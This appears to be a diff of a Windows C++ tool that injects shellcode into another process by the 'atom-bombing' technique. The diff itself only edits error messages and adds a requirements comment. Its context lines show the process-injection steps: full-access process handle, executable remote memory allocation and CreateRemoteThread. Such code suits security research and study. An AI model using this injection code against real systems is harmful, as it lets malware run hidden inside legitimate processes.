@@ -2,6 +2,8 @@
 * Injects a shellcode payload a process using an APC to call GlobalGetAtomNameA in the remote process (atom-bombing).
 * The shellcode can then be executed using any execution primitive. We use CreateRemoteThread here because its the most convinient.
 * Supports 32- and 64 Bit applications.
+* [Requirements]
+*	- atleast one thread must be in alertable state at some point
 */
 
 #include <Windows.h>
@@ -83,7 +85,7 @@ int main(int argc, char* argv[])
 	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
 	if (processesSnapshot == INVALID_HANDLE_VALUE)
 	{
-		printf("Error %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
+		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
 		return 1;
 	}
 
@@ -91,7 +93,7 @@ int main(int argc, char* argv[])
 	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
 	if (!Process32First(processesSnapshot, &processEntry))
 	{
-		printf("Error %d - Failed to Process32First\n", GetLastError());
+		printf("[Error] %d - Failed to Process32First\n", GetLastError());
 		return 1;
 	}
 
@@ -109,14 +111,14 @@ int main(int argc, char* argv[])
 
 	if (!foundTargetProcess)
 	{
-		printf("Error - Failed to find process: %s\n", processName);
+		printf("[Error] - Failed to find process: %s\n", processName);
 		return 1;
 	}
 
 	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
 	if (!targetProcessHandle)
 	{
-		printf("Error %d - Failed to acquire process handle\n", GetLastError());
+		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
 		return 1;
 	}
 
@@ -124,7 +126,7 @@ int main(int argc, char* argv[])
 	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
 	if (!Thread32First(processesSnapshot, &currentThreadEntry))
 	{
-		printf("Error %d - Failed to Thread32First\n", GetLastError());
+		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
 		return 1;
 	}
 
@@ -132,7 +134,7 @@ int main(int argc, char* argv[])
 	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (!remoteMemory)
 	{
-		printf("Error %d - Failed to allocate memory in target process\n", GetLastError());
+		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
 		return 1;
 	}
 
@@ -176,7 +178,7 @@ int main(int argc, char* argv[])
 	HANDLE hThread = CreateRemoteThread(targetProcessHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteMemory), nullptr, 0, nullptr);
 	if (!hThread)
 	{
-		printf("Error %d - Failed to CreateRemoteThread\n", GetLastError());
+		printf("[Error] %d - Failed to CreateRemoteThread\n", GetLastError());
 		return 1;
 	}
 
